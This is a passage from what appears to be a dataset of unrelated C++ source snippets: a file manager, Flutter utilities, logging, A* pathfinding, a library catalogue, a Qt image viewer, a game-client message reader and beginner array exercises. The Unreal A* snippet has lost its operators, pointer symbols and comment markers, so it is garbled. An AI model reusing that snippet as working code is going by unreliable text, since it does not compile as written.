position in the vector<string> we are trying to solve\nwords: the array we are trying to solve\nrule_set: the rules of given words\n*/\nint number_of_combinations(int index, vector<string>& words, std::map<std::string, WordSet>& rule_set) {\n\tint num_combos = 0;\n\tstring prev_word = \"_____\";\n\tstring next_word = \"_____\";\n\t/* Check if we can get the previous word */\n\tif (index - 1 >= 0) {\n\t\t/* Get all words this word could be */\n\t\tprev_word = words[index - 1];\n\t}\n\n\tif (index + 1 < words.size()) {\n\t\tnext_word = words[index + 1];\n\t}\n\n\treturn get_combinations(prev_word, next_word, rule_set);\n\n}\n\n\nvector<int> all_entropy(vector<string>& words, std::map<std::string, WordSet>& rule_set)\n{\n\tvector<int> output;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\toutput.push_back(number_of_combinations(i, words, rule_set));\n\t}\n\n\treturn output;\n}\n\nint find_least_combos(vector<string>& words, std::map<std::string, WordSet>& rule_set)\n{\n\tint lowest_combo = INT_MAX;\n\tint index = -1;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i] != \"_____\") {\n\t\t\tcontinue;\n\t\t}\n\n\t\tint value = number_of_combinations(i, words, rule_set);\n\t\tif (value < lowest_combo) {\n\t\t\tlowest_combo = value;\n\t\t\tindex = i;\n\t\t}\n\t}\n\n\treturn index;\n\n}\n\nstring vector_to_string(vector<string>& words)\n{\n\tstring output;\n\n\tfor (string s : words) {\n\t\toutput += s + \" \";\n\t}\n\n\treturn output;\n\n}\n\nvoid fill_least_entropy_position(vector<string>& words, std::map<std::string, WordSet>& rule_set, std:",
    "#include <iostream>\r\n#include <fstream>\r\n#include <cstdio>\r\n#include <cstring>\r\n#include <windows.h>\r\n#include <direct.h>\r\n\r\nusing namespace std;\r\n\r\n// function to create a new file\r\nvoid create_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to create: \";\r\n    getline(cin, file_name);\r\n    ofstream file(file_name.c_str());\r\n    file.close();\r\n    cout << \"File '\" << file_name << \"' created successfully!\\n\";\r\n}\r\n\r\n// function to read the contents of a file\r\nvoid read_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to read: \";\r\n    getline(cin, file_name);\r\n    ifstream file(file_name.c_str());\r\n    if (file.is_open()) {\r\n        cout << \"Contents of file '\" << file_name << \"':\\n\";\r\n        string line;\r\n        while (getline(file, line)) {\r\n            cout << line << endl;\r\n        }\r\n        file.close();\r\n    } else {\r\n        cout << \"Unable to open file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to write to a file\r\nvoid write_file() {\r\n    string file_name, content;\r\n    cout << \"Enter the name of the file to update: \";\r\n    getline(cin, file_name);\r\n    cout << \"Enter the content to add: \";\r\n    getline(cin, content);\r\n    ofstream file(file_name.c_str(), ios::app);\r\n    if (file.is_open()) {\r\n        file << content << endl;\r\n        file.close();\r\n        cout << \"File '\" << file_name << \"' updated successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to open file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to delete a file\r\nvoid delete_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to delete: \";\r\n    getline(cin, file_name);\r\n    if (remove(file_name.c_str()) == 0) {\r\n        cout << \"File '\" << file_name << \"' deleted successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to delete file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to check if a file exists\r\nbool file_exists(const char* file_name) {\r\n    DWORD file_attr = GetFileAttributesA(file_name);\r\n    return (file_attr != INVALID_FILE_ATTRIBUTES && !(file_attr & FILE_ATTRIBUTE_DIRECTORY));\r\n}\r\n\r\n// function to rename a file\r\nvoid rename_file() {\r\n    string old_name, new_name;\r\n    cout << \"Enter the name of the file to rename: \";\r\n    getline(cin, old_name);\r\n    cout << \"Enter the new name for the file: \";\r\n    getline(cin, new_name);\r\n    if (rename(old_name.c_str(), new_name.c_str()) == 0) {\r\n        cout << \"File '\" << old_name << \"' renamed to '\" << new_name << \"' successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to rename file '\" << old_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to create a new directory\r\nvoid create_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to create: \";\r\n    getline(cin, directory_name);\r\n    if (_mkdir(directory_name.c_str()) == 0) {\r\n        cout << \"Directory '\" << directory_name << \"' created successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to create directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to delete a directory\r\nvoid delete_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to delete: \";\r\n    getline(cin, directory_name);\r\n    if (_rmdir(directory_name.c_str()) == 0) {\r\n        cout << \"Directory '\" << directory_name << \"' deleted successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to delete directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to list all files in a directory\r\nvoid list_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to list: \";\r\n    getline(cin, directory_name);\r\n    WIN32_FIND_DATAA find_data;\r\n    HANDLE handle = FindFirstFileA((directory_name + \"/*\").c_str(), &find_data);\r\n    if (handle != INVALID_HANDLE_VALUE) {\r\n        cout << \"Files in directory '\" << directory_name << \"':\\n\";\r\n        do {\r\n            if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {\r\n                cout << find_data.cFileName << endl;\r\n            }\r\n        } while (FindNextFileA(handle, &find_data));\r\n        FindClose(handle);\r\n    } else {\r\n        cout << \"Unable to open directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// main function\r\nint main() {\r\n    int choice;\r\n    do {\r\n        cout << \"File Management System Menu:\\n\";\r\n        cout << \"1. Create a new file\\n\";\r\n        cout << \"2. Read the contents of a file\\n\";\r\n        cout << \"3. Write to a file\\n\";\r\n        cout << \"4. Delete a file\\n\";\r\n        cout << \"5. Rename a file\\n\";\r\n        cout << \"6. Create a new directory\\n\";\r\n        cout << \"7. Delete a directory\\n\";\r\n        cout << \"8. List all files in a directory\\n\";\r\n        cout << \"9. Exit\\n\";\r\n        cout << \"Enter your choice (1-9): \";\r\n        cin >> choice;\r\n        cin.ignore();\r\n        switch (choice) {\r\n            case 1:\r\n                create_file();\r\n                break;\r\n            case 2:\r\n                read_file();\r\n                break;\r\n            case 3:\r\n           ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\ufeff#include \"Entry.h\"\n\n#if defined(USING_LOGGING)\n\n#include <cstdarg>\n#include <cstdio>\n#include \"../../AccurateClock.h\"\n\nnamespace Logging {\n\n\n\nunsigned BaseEntry::_counterEntry { 0 };\n\nAccurateClock MinLogEntry::_clock;\n\nvoid MinLogEntry::StartAccurateClock()\n{\n\t_clock.Start();\n}\n\nMinLogEntry::MinLogEntry(const Level level, const char* format, ...)\n{\n\tmessage = SharedPtr<char>(new char[SIZE_OF_BUFFERS]);\n\tthis->level = level;\n\tid = ++_counterEntry;\n\tva_list args;\n\tva_start(args, format);\n\tvsprintf(message.Get(), format, args);\n\tva_end(args);\n\ttimeStamp = _clock.GetTimeStamp();\n}\n\nLogEntry::LogEntry(const Level level, const char* format, ...)\n{\n\tmessage = SharedPtr<char>(new char[SIZE_OF_BUFFERS]);\n\tthis->level = level;\n\tid = ++_counterEntry;\n\tva_list args;\n\tva_start(args, format);\n\tvsprintf(message.Get(), format, args);\n\tva_end(args);\n\ttimeStamp = _clock.GetTimeStamp();\n}\n\nLogEntry::LogEntry(const Level level, const char* nameFile,\n\tconst char* nameFunction, const unsigned numberLine, const char* format, ...)\n\t: nameFile(nameFile), nameFunction(nameFunction), numberLine(numberLine)\n{\n\tmessage = SharedPtr<char>(new char[SIZE_OF_BUFFERS]);\n\tthis->level = level;\n\tid = ++_counterEntry;\n\tva_list args;\n\tva_start(args, format);\n\tvsprintf(message.Get(), format, args);\n\tva_end(args);\n\ttimeStamp = _clock.GetTimeStamp();\n}\n\n#if defined(USING_LOGGING_COVERAGE)\nCovEntry::CovEntry(Statement statement, const unsigned numberNameFile, const unsigned numberLine)\n\t: statement(statement), numberNameFile(numberNameFile), numberLine(numberLine)\n{\n\tid = ++_counterEntry;\n}\n#endif // defined(USING_LOGGING_COVERAGE)\n\n} // namespace Logging\n#endif // defined(USING_LOGGING)\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "void ALevelGeneratorCalculatePath()\r\n{\r\n    UE_LOG(LogTemp, Warning, TEXT(Starting A Path Calculation));\r\n\r\n    EnsureCurrentNodeForShips();\r\n\r\n     Define a lambda for comparing nodes in the priority queue by their F value (G + H)\r\n    auto CompareNodes = [](GridNode a, GridNode b) { return a-F  b-F; };\r\n\r\n    for (AShip Ship  Ships)\r\n    {\r\n    \tstdpriority_queueGridNode, stdvectorGridNode, decltype(CompareNodes) queue(CompareNodes);\r\n    \tResetAllNodes();\r\n         Reset distances, parent pointers, and heuristic values for all nodes\r\n        for (int y = 0; y  MAX_MAP_SIZE; y++)\r\n        {\r\n            for (int x = 0; x  MAX_MAP_SIZE; x++)\r\n            {\r\n                GridNode node = WorldArray[y][x];\r\n                if (node)\r\n                {\r\n                    node-G = 100000;  Initially high G value\r\n                    node-H = CalculateHeuristic(node, Ship-GoalNode);  Manhattan distance as heuristic\r\n                    node-F = node-G + node-H;\r\n                    node-Parent = nullptr;\r\n                }\r\n            }\r\n        }\r\n\r\n        GridNode startNode = Ship-CurrentNode;\r\n        startNode-G = 0;\r\n        startNode-F = startNode-G + startNode-H;\r\n        queue.push(startNode);\r\n\r\n        while (!queue.empty())\r\n        {\r\n            GridNode current = queue.top();\r\n            queue.pop();\r\n        \tSearchCount++;\r\n\r\n            if (current == Ship-GoalNode) break;\r\n\r\n            TArrayGridNode neighbors = GetNeighbors(current);\r\n\r\n            for (GridNode neighbor  neighbors)\r\n            {\r\n                float tentativeG = current-G + neighbor-GetTravelCost();\r\n                float tentativeF = tentativeG + neighbor-H;  F = G + H\r\n\r\n                if (tentativeF  neighbor-F)\r\n                {\r\n                    neighbor-Parent = current;\r\n                    neighbor-G = tentativeG;\r\n                    neighbor-F = tentativeF;\r\n\r\n                     A node may be added to the queue multiple times with different F values;\r\n                     we only care about the smallest one.\r\n                    queue.push(neighbor);\r\n                }\r\n            }\r\n        }\r\n    \t\r\n        RenderPath(Ship);  Visualize the path\r\n    }\r\n\r\n    UE_LOG(LogTemp, Warning, TEXT(Finished A Path Calculation));\r\n}",
    "#include <iostream>\n#include \"library.hpp\"\n#include <string>\n#include <time.h>\n#include <vector>\n#include <algorithm>\n#include <unordered_map>\n#include <limits>\n\nusing namespace std;\n\n// Fun\u00e7\u00e3o de retorno ao menu, a fim de permitir que o usu\u00e1rio tenha um tempo de leitura.\nvoid menuReturn(){\n    char menu;\n    while(true){\n        cout << \"Digite 'Y' para voltar ao menu: \";\n        cin >> menu;\n        if(menu == 'y' || menu == 'Y') {\n            break;\n        }\n    }\n}\n\n// Fun\u00e7\u00e3o para converter tempo de segundo para String\nvoid printDate(time_t dateInSeconds) {\n    struct tm * timeinfo;\n    timeinfo = localtime(&dateInSeconds);\n    cout << asctime(timeinfo);\n}\n\n// Fun\u00e7\u00e3o para registro de livro.\nvoid registerBooks(Book books[], int bookSize){\n    cout << \"-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=\" << endl;\n    cout << \"      ADICIONAR LIVRO\" << endl;\n    cout << \"-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=\" << endl;\n\n    int id, available;\n    string title, author, year;\n\n    cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\n    cout << \"Titulo: \";\n    getline(cin, title);\n\n    cout << \"Autor: \";\n    getline(cin, author);\n\n    cout << \"Ano de Lan\u00e7amento: \";\n    cin >> year;\n    \n\n    cout << \"Unidades disponiveis: \";\n    cin >> available;\n\n\n    // Encontrar um ID dispon\u00edvel\n    for(int i=0; i<bookSize; i++){\n        if(books[i].title.empty()){\n            id = i + 1; // ID come\u00e7a de 1\n            break;\n        }\n    }\n\n    // Criar e adicionar o livro\n    Book book;\n    book.id = id;\n    book.title = title;\n    book.author = author;\n    book.year = year;\n    book.available = available;\n    books[id - 1] = book; // Ajuste do \u00edndice\n\n    cout << \"Livro cadastrado com sucesso.\\nC\u00f3digo de identifica\u00e7\u00e3o do livro: \" << id << endl;\n\n    menuReturn();\n}\n\n\n// Fun\u00e7\u00e3o para listagem de livros.\nvoid listBooks(Book books[], int bookSize){\n    cout << \"-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=\" << endl;\n    cout << \"       CATALOGO DE LIVROS\" << endl;\n    cout << \"-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=\" << endl;\n    for(int i = 0; i < bookSize; i++){\n        if (!books[i].title.empty() && !books[i].author.empty() && !books[i].year.empty()) {\n            cout << \"Informa\u00e7\u00f5es do Livro (\" << books[i].id << \")\" << endl;\n            cout << \"Titulo: \" << books[i].title << endl;\n            cout << \"Autor: \" << books[i].author << endl;\n            cout << \"Ano de Lan\u00e7amento: \" << books[i].year << endl;\n            cout << \"Unidades disponiveis: \";\n            if(books[i].available > 0){\n                cout << books[i].available << endl;\n            } else {\n                cout << \"Indisponivel\" << endl;\n            }\n            cout << \"-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=\" << endl;\n        }\n    }\n\n    menuReturn();\n}\n\nvoid findBooks(Book books[], int bookSize, int choice, string word){\n    vector<Book> results;\n\n    transform(word.begin(), word.end(), word.begin(), ::tolower);\n\n    if(choice == 1){\n        for(int i=0; i<bookSize; i++){\n            string titleLower = books[i].title;\n            transform(titleLower.begin(), titleLower.end(), titleLower.begin(), ::tolower);\n\n            if(titleLower.find(word) != string::npos){\n                results.push_back(books[i]);\n            }\n        }\n    } else if (choice == 2) {\n        for(int i=0; i<bookSize; i++){\n            string authorLower = books[i].author;\n            transform(authorLower.begin(), authorLower.end(), authorLower.begin(), ::tolower);\n\n            if(authorLower.find(word) != string::npos){\n                results.push_back(books[i]);\n            }\n        }\n    } else if (choice == 3) {\n        for(int i=0; i<bookSize; i++){\n            string yearLower = books[i].year;\n            transform(yearLower.begin(), yearLower.end(), yearLower.begin(), ::tolower);\n\n            if(yearLower.find(word) != string::npos){\n                results.push_back(books[i]);\n            }\n        }\n    }\n\n    if(results.empty()) {\n        cout << \"Nenhum resultado encontrado.\" << endl;\n    } else {\n        cout << \"Livros encontrados: \" << endl;\n        for(const auto& book : results){\n            cout << \"Titulo: \" << book.title << \" (\" << book.id << \")\" << endl;\n            cout << \"Autor: \" << book.author << endl;\n            cout << \"Ano de Lan\u00e7amento: \" << book.year << endl;\n            cout << \"Unidades disponiveis: \";\n            if(book.available > 0){\n                cout << book.available << endl;\n            } else {\n                cout << \"Indisponivel\" << endl;\n            }\n            cout << \"-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=\" << endl;\n        }\n    }\n    \n    menuReturn();\n}\n\n// Fun\u00e7\u00e3o para registro de usu\u00e1rios.\nvoid registerUser(User users[], int userSize){\n\n    cout << \"-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=\" << endl;\n    cout << \"      ADICIONAR USU\u00c1RIO\" << endl;\n    cout << \"-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=\" << endl;\n\n    int id;\n    string name;\n    \n    cout << \"Nome: \";\n    cin.ignore();\n    getline(cin, name);\n    \n    bool nameInUse;\n    \n    do {\n        nameInUse = false;\n ",
    "//\n// Created by Naren Sadhwani on 01.04.24.\n//\n#include <QApplication>\n#include <QFileDialog>\n#include <QMessageBox>\n#include <QPixmap>\n#include <QKeyEvent>\n#include <QDebug>\n#include \"../Header/MainWindow.h\"\n#include <opencv2/opencv.hpp>\n#include <QPluginLoader>\n\nMainWindow::MainWindow(QWidget *parent) :\n    QMainWindow(parent)\n    , fileMenu(nullptr)\n    , viewMenu(nullptr)\n    ,currentImage(nullptr){\n    imageScene = new QGraphicsScene(this); // Initialize imageScene\n    imageView = new QGraphicsView(imageScene, this);\n    initUI();\n    loadPlugins();\n}\n\nvoid MainWindow::initUI() {\n\n    this->resize(800, 600);\n\n    // Create the menu bar\n    fileMenu = menuBar()->addMenu(\"&File\");\n    viewMenu = menuBar()->addMenu(\"&View\");\n    editMenu = menuBar()->addMenu(\"&Edit\");\n\n    // Create the toolbars\n    fileToolBar = addToolBar(\"File\");\n    viewToolBar = addToolBar(\"View\");\n    editToolBar = addToolBar(\"Edit\");\n    setCentralWidget(imageView);\n\n    // set up the status bar\n    mainStatusBar = statusBar();\n    mainStatusLabel = new QLabel(mainStatusBar);\n    mainStatusBar->addPermanentWidget(mainStatusLabel);\n    mainStatusLabel->setText(\"Image will be displayed here\");\n\n    createActions();\n}\n\nvoid MainWindow::createActions(){\n\n    // Create the actions and add them to the menu and toolbar\n    // Open action\n    openAction =  new QAction(\"Open\", this);\n    fileMenu->addAction(openAction);\n    // Save as action\n    saveAsAction = new QAction(\"Save As\", this);\n    fileMenu->addAction(saveAsAction);\n    // Exit action\n    exitAction = new QAction(\"Exit\", this);\n    fileMenu->addAction(exitAction);\n    // Zoom in action\n    zoomInAction = new QAction(\"Zoom In\", this);\n    viewMenu->addAction(zoomInAction);\n    // Zoom out action\n    zoomOutAction = new QAction(\"Zoom Out\", this);\n    viewMenu->addAction(zoomOutAction);\n    // Previous action\n    prevAction = new QAction(\"Previous\", this);\n    viewMenu->addAction(prevAction);\n    // Next action\n    nextAction = new QAction(\"Next\", this);\n    viewMenu->addAction(nextAction);\n    // Blur action\n    blurAction = new QAction(\"Blur\", this);\n    editMenu->addAction(blurAction);\n    // Undo action\n    undoAction = new QAction(\"Reset\", this);\n    editMenu->addAction(undoAction);\n\n\n    // Add the actions to the toolbar\n\n    // File toolbar actions\n    fileToolBar->addAction(openAction);\n    fileToolBar->addAction(saveAsAction);\n    fileToolBar->addAction(exitAction);\n    // View toolbar actions\n    viewToolBar->addAction(zoomInAction);\n    viewToolBar->addAction(zoomOutAction);\n    viewToolBar->addAction(prevAction);\n    viewToolBar->addAction(nextAction);\n    // Edit toolbar actions\n    editToolBar->addAction(undoAction);\n    editToolBar->addAction(blurAction);\n\n\n    // Connect the actions to the slots\n    connect(exitAction, SIGNAL(triggered(bool)), QApplication::instance(), SLOT(quit()));\n    connect(openAction, SIGNAL(triggered(bool)), this, SLOT(openImage()));\n    connect(saveAsAction, SIGNAL(triggered(bool)), this, SLOT(saveAs()));\n    connect(zoomInAction, SIGNAL(triggered(bool)), this, SLOT(zoomIn()));\n    connect(zoomOutAction, SIGNAL(triggered(bool)), this, SLOT(zoomOut()));\n    connect(prevAction, SIGNAL(triggered(bool)), this, SLOT(prevImage()));\n    connect(nextAction, SIGNAL(triggered(bool)), this, SLOT(nextImage()));\n    connect(blurAction, SIGNAL(triggered(bool)), this, SLOT(blurImage()));\n    connect(undoAction, SIGNAL(triggered(bool)), this, SLOT(resetImage()));\n\n\n    // Set up the shortcuts\n    setupShortcuts();\n}\n\nvoid MainWindow::openImage(){\n\n    qDebug() << \"slot openImage is called\";\n    QFileDialog dialog(this);\n    dialog.setWindowTitle(\"Open Image\");\n    dialog.setFileMode(QFileDialog::ExistingFile);\n    dialog.setNameFilter(tr(\"Images (*.png *.bmp *.jpg)\"));\n    QStringList filePaths;\n    if (dialog.exec()) {\n        filePaths = dialog.selectedFiles();\n        showImage(filePaths.at(0));\n    }\n\n}\n\nvoid MainWindow::showImage(const QString& path)\n{\n    //qDebug() <<\"Path is: \" << path;\n\n    imageScene->clear();\n    imageView->resetTransform();\n\n    QPixmap image(path);\n    currentImage = imageScene->addPixmap(image);\n    imageScene->update();\n    imageView->setSceneRect(image.rect());\n    QString status = QString(\"%1, %2x%3, %4 Bytes\").arg(path).arg(image.width())\n            .arg(image.height()).arg(QFile(path).size());\n    mainStatusLabel->setText(status);\n    currentImagePath = path;\n\n}\n\nvoid MainWindow::setupShortcuts() {\n    QList<QKeySequence> shortcuts;\n    shortcuts<< Qt::Key_Plus<< Qt::Key_Equal;\n    zoomInAction->setShortcuts(shortcuts);\n    shortcuts.clear();\n\n    shortcuts << Qt::Key_Minus << Qt::Key_Underscore;\n    zoomOutAction->setShortcuts(shortcuts);\n    shortcuts.clear();\n\n    shortcuts << Qt::Key_Left << Qt::Key_Up;\n    prevAction->setShortcuts(shortcuts);\n    shortcuts.clear();\n\n    shortcuts << Qt::Key_Right << Qt::Key_Down;\n    nextAction->setShortcuts(shortcuts);\n    shortcuts.clear();\n\n}\n\nvoid MainWindow::zoomIn() {\n    ima",
    "/*\n * Copyright (c) 2010-2022 OTClient <https://github.com/edubart/otclient>\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n#include \"inputmessage.h\"\n#include <framework/util/crypt.h>\n\nvoid InputMessage::reset()\n{\n    m_messageSize = 0;\n    m_readPos = MAX_HEADER_SIZE;\n    m_headerPos = MAX_HEADER_SIZE;\n}\n\nvoid InputMessage::setBuffer(const std::string& buffer)\n{\n    const int len = buffer.size();\n    reset();\n    checkWrite(len);\n    memcpy(m_buffer + m_readPos, buffer.data(), len);\n    m_readPos += len;\n    m_messageSize += len;\n}\n\nuint8_t InputMessage::getU8()\n{\n    checkRead(1);\n    const uint8_t v = m_buffer[m_readPos];\n    m_readPos += 1;\n    return v;\n}\n\nuint16_t InputMessage::getU16()\n{\n    checkRead(2);\n    const uint16_t v = stdext::readULE16(m_buffer + m_readPos);\n    m_readPos += 2;\n    return v;\n}\n\nuint32_t InputMessage::getU32()\n{\n    checkRead(4);\n    const uint32_t v = stdext::readULE32(m_buffer + m_readPos);\n    m_readPos += 4;\n    return v;\n}\n\nuint64_t InputMessage::getU64()\n{\n    checkRead(8);\n    const uint64_t v = stdext::readULE64(m_buffer + m_readPos);\n    m_readPos += 8;\n    return v;\n}\n\nint64_t InputMessage::get64()\n{\n    checkRead(8);\n    const int64_t v = stdext::readSLE64(m_buffer + m_readPos);\n    m_readPos += 8;\n    return v;\n}\n\nstd::string InputMessage::getString()\n{\n    const uint16_t stringLength = getU16();\n    checkRead(stringLength);\n    const char* v = (char*)(m_buffer + m_readPos);\n    m_readPos += stringLength;\n    return std::string(v, stringLength);\n}\n\ndouble InputMessage::getDouble()\n{\n    const uint8_t precision = getU8();\n    const int32_t v = getU32() - INT_MAX;\n    return (v / std::pow(10.f, precision));\n}\n\nbool InputMessage::decryptRsa(int size)\n{\n    checkRead(size);\n    g_crypt.rsaDecrypt(static_cast<uint8_t*>(m_buffer) + m_readPos, size);\n    return (getU8() == 0x00);\n}\n\nvoid InputMessage::fillBuffer(uint8_t* buffer, uint16_t size)\n{\n    checkWrite(m_readPos + size);\n    memcpy(m_buffer + m_readPos, buffer, size);\n    m_messageSize += size;\n}\n\nvoid InputMessage::setHeaderSize(uint16_t size)\n{\n    assert(MAX_HEADER_SIZE - size >= 0);\n    m_headerPos = MAX_HEADER_SIZE - size;\n    m_readPos = m_headerPos;\n}\n\nbool InputMessage::readChecksum()\n{\n    const uint32_t receivedCheck = getU32();\n    const uint32_t checksum = stdext::adler32(m_buffer + m_readPos, getUnreadSize());\n    return receivedCheck == checksum;\n}\n\nbool InputMessage::canRead(int bytes) const\n{\n    if ((m_readPos - m_headerPos + bytes > m_messageSize) || (m_readPos + bytes > BUFFER_MAXSIZE))\n        return false;\n    return true;\n}\nvoid InputMessage::checkRead(int bytes)\n{\n    if (!canRead(bytes))\n        throw stdext::exception(\"InputMessage eof reached\");\n}\n\nvoid InputMessage::checkWrite(int bytes)\n{\n    if (bytes > BUFFER_MAXSIZE)\n        throw stdext::exception(\"InputMessage max buffer size reached\");\n}",
    "\ufeff#include <iostream>\nusing namespace std;\nusing std::cin;\nusing std::cout;\nusing std::endl;\n\n#define tab \"\\t\"\n\nvoid FillRand(int arr[], const int n);\nvoid Print(int arr[], const int n);\nvoid Sort(int arr[], const int n);\nint Sum(int arr[], const int n);\ndouble Avg(int arr[], const int n);\nint Min(int arr[], const int n);\nint Max(int arr[], const int n);\nvoid shiftLeft(int shift, int arr[], const int n);\nvoid shiftRight(int shift, int arr[], const int n);\n\nvoid main()\n{\n\tsetlocale(LC_ALL, \"\");\n\tconst int n = 5;\n\tint arr[n];\n\tint shift;\n\n\tcout << \"\u0418\u0441\u0445\u043e\u0434\u043d\u044b\u0439 \u043c\u0430\u0441\u0441\u0438\u0432: \";\n\tFillRand(arr, n);\n\tPrint(arr, n);\n\tcout << \"\u041e\u0442\u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u043c\u0430\u0441\u0441\u0438\u0432: \";\n\tSort(arr, n);\n\tPrint(arr, n);\n\tcout << \"\u0421\u0443\u043c\u043c\u0430 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u043c\u0430\u0441\u0441\u0438\u0432\u0430: \" << Sum(arr, n) << endl;\n\tcout << \"\u0421\u0440\u0435\u0434\u043d\u0435\u0435-\u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435: 